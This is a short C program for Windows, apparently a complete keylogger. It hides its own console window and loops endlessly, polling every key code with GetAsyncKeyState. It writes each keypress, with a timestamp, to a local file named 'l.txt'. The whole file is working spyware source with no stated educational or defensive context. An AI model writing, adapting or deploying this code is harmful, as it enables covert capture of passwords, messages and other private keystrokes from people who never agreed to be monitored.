#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <time.h>

void getDateTime(char *buffer, int size)
{
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    snprintf(buffer, size, "%02d/%02d/%04d %02d:%02d:%02d",
             tm.tm_mday, tm.tm_mon + 1, tm.tm_year + 1900,
             tm.tm_hour, tm.tm_min, tm.tm_sec);
}


int main()
{
    FILE *arquivo;
    int t;
    char datetime[20];
    char keyState[256] = {0}; 

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (1)
    {
        Sleep(10);

        arquivo = fopen("l.txt", "a+");
        if (arquivo == NULL)
        {
            ExitProcess(1);
        }

        for (t = 8; t <= 255; t++)
        {
            if ((GetAsyncKeyState(t) & 0x8000) && !keyState[t])
            {
                keyState[t] = 1; 

                getDateTime(datetime, sizeof(datetime)); 

                if (t >= 32 && t <= 126)
                {
                    
                    fprintf(arquivo, "[%s] %c\n", datetime, (char)t);
                }
                else if (t == VK_SPACE)
                {
                    fprintf(arquivo, "[%s] [SPACE]\n", datetime);
                }
                else if (t == VK_RETURN)
                {
                    fprintf(arquivo, "[%s] [ENTER]\n", datetime);
                }
                else if (t == VK_TAB)
                {
                    fprintf(arquivo, "[%s] [TAB]\n", datetime);
                }
                else if (t == VK_BACK)
                {
                    fprintf(arquivo, "[%s] [BACKSPACE]\n", datetime);
                }
            }
            
            else if (!(GetAsyncKeyState(t) & 0x8000) && keyState[t])
            {
                keyState[t] = 0; 
            }
        }

        fflush(arquivo);
        fclose(arquivo);
    }

    return 0;
}
